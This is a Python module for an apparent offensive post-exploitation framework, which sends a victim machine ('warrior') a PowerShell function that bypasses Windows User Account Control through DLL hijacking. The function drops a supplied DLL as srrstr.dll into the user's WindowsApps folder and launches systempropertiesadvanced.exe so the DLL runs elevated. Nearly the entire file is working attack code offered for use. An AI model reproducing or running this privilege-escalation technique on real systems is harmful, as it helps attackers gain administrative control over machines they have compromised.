from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "invoke-systempropertiesadvanced",
                       "Description": "UAC bypass through DLL Hijacking method (systempropertiesadvanced binary)",
                       "Author": "@josueencinar"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "dll": [None, "DLL name", True],
                   "user": [None, "Windows username", True]
                   }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = '''function invoke-systempropertiesadvanced{
            param(
                [Parameter(Mandatory)]
                [string] $dll,
                [Parameter(Mandatory)]
                [String] $user
            )
    
            #Data
            $dll_name = "srrstr.dll"
            $path = "C:\\Users\\$user\\AppData\\Local\\Microsoft\\WindowsApps"
            $dest = "$path\\$dll_name"

            #Check folder
            $exist = Test-Path -Path $path
            if (-not $exist) {
                mkdir $path
            }

            if (-not (Test-Path $dll)){
                return
            }

           if (Test-Path $dll){
                Copy-Item $dll $dest

                #Run Process
                Start-Process C:\windows\syswow64\systempropertiesadvanced.exe

            }
        }
        '''

            
        function += 'invoke-systempropertiesadvanced -dll "{}" -user "{}"'.format(self.args["dll"], self.args["user"])
        super(CustomModule, self).run(function)